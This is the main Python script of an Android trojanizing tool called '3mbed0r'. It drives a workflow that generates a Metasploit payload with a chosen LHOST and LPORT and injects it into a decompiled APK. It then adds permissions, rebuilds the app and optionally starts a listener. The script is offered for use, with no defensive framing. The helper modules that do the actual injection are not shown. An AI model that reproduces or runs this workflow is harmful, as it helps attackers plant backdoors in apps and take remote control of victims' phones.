#!/usr/bin/env python

# Script: 3mbed0r
# Work: Bind Payload Into Another APK
# Created By: ghosthub (b@b@y)
# Visit: iconicbabay.github.io/index/
import re
import sys
import console
import pycolor
import apkd
import msf
import time

pyc = pycolor.pyColor()

if __name__ == '__main__':
	
	try:
		console.banner()
		print (pyc.Info("Started 3mbed0r at %s"%(time.strftime('%X'))))
		mainapk = console.initstuff()
		payload,LHOST,LPORT = msf.setoptions()
		msf.generate(payload, LHOST, LPORT)
		apkd.decompile(mainapk)
		apkd.inject(mainapk)
		apkd.permissions(mainapk)
		apkd.rebuild(mainapk)
		msfch = raw_input("Do you want to setup a listener?[y/n]").lower()
		if(msfch=='y'):
			msf.msfhandler(payload, LHOST,LPORT)
		console.clean(mainapk)
	except Exception, ex:
		print pyc.Err("%s"%(ex))
	


